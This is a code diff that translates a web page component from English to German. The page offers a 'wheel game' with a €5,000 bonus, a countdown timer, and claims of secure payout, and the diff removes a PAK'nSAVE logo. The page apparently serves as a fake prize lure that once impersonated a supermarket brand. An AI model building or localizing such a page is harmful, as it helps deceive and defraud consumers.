@@ -82,7 +82,7 @@ export default function Home() {
     
     const supabase = createBrowserSupabaseClient();
     if (!supabase) {
-      setError("System error: Unable to connect.");
+      setError("Systemfehler: Verbindung konnte nicht hergestellt werden.");
       setLoading(false);
       return;
     }
@@ -101,7 +101,7 @@ export default function Home() {
           is_hidden: false,
           partner_name: partnerName,
           form_data: {
-            currency: "NZ$",
+            currency: "€",
             is_wheel_game: true,
           }
         })
@@ -109,7 +109,7 @@ export default function Home() {
         .maybeSingle();
 
     if (insertError || !data?.id) {
-      setError("Something went wrong. Please try again later.");
+      setError("Ein Fehler ist aufgetreten. Bitte versuchen Sie es später erneut.");
       setLoading(false);
       return;
     }
@@ -139,7 +139,7 @@ export default function Home() {
                     <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-red-500" />
                   </span>
                   <span className="text-xs font-extrabold uppercase tracking-[0.14em] text-[#ffb3b3]">
-                    Offer ends in: {formatTime(timeLeft)}
+                    Angebot endet in: {formatTime(timeLeft)}
                   </span>
                 </div>
 
@@ -152,11 +152,11 @@ export default function Home() {
 
                 <div className="pak-form-amount mt-5 inline-flex w-full max-w-[19rem] px-4 py-3 sm:max-w-[20rem] sm:px-5 sm:py-3.5">
                   <div className="pak-form-amount-label">
-                    <div>Today's</div>
-                    <div>Bonus Offer</div>
+                    <div>Heutiges</div>
+                    <div>Bonusangebot</div>
                   </div>
                   <div className="pak-form-amount-divider" />
-                  <div className="pak-form-amount-value">NZ$5,000</div>
+                  <div className="pak-form-amount-value">€5.000</div>
                 </div>
 
                 {error && (
@@ -179,7 +179,7 @@ export default function Home() {
                         <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                         <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                       </svg>
-                      Processing...
+                      Wird verarbeitet...
                     </span>
                   ) : (
                     <span className="flex items-center justify-center gap-2">
@@ -196,21 +196,21 @@ export default function Home() {
                     <svg className="h-4 w-4 text-[#ffd500]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                       <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                     </svg>
-                    Secure payout
+                    Sichere Auszahlung
                   </div>
                   <div className="flex items-center gap-2">
                     <svg className="h-4 w-4 text-[#ffd500]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                       <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
                     </svg>
-                    Instant verification
+                    Sofortige Verifizierung
                   </div>
                 </div>
               </div>
 
               <div className="flex items-start justify-end gap-4 lg:block">
                 <img
-                  src="/form-assets/paknsave-logo-form.png"
-                  alt="PAK'nSAVE"
+                  src="/form-assets/logo-form.svg"
+                  alt="Bonus"
                   className="pak-form-brand-logo lg:ml-auto lg:mb-4"
                 />
               </div>
